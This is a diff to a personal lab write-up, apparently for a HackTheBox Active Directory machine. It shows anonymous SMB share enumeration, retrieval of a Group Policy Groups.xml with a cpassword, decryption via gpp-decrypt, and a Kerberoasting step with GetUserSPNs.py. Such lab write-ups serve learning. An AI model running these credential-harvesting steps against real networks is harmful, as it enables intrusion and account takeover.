@@ -48,9 +48,9 @@ smbclient -N //10.129.104.132/Replication
 smbmap -R Replication -H 10.129.104.132
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/668453a2-4d8e-409c-9b14-4995ce6d786f/7f02d19f-e1fd-4173-91f6-80d10b392111/image.png)
 
-After seeing these files on the walkthrough it shows a groups.xml which i could see so i used the following to download all
+
+After seeing these files  it shows a groups.xml which i could see so i used the following to download all
 
 ```bash
 smbclient -N //10.129.104.132/Replication
@@ -63,9 +63,6 @@ smb: \> mget *
 
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/668453a2-4d8e-409c-9b14-4995ce6d786f/e30cc1dc-5212-4c7c-9b8c-760ee5120f90/image.png)
-
-in truth for whatever reason i coldnt get the file > so i had to grab online 
 
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-
@@ -76,7 +73,7 @@ cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
 /NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
 userName="a
 
-In this xml we find the username and a encrypted passsword,m after decriptopnm 
+In this xml we find the username and a encrypted passsword,m after decription 
 
 ```bash
 gpp-decrypt
@@ -118,7 +115,7 @@ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.104.132
 
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/668453a2-4d8e-409c-9b14-4995ce6d786f/b74c68ca-82f8-48b9-9cf3-1f11a8817419/image.png)
+
 
 We see admin has it enabled!
 
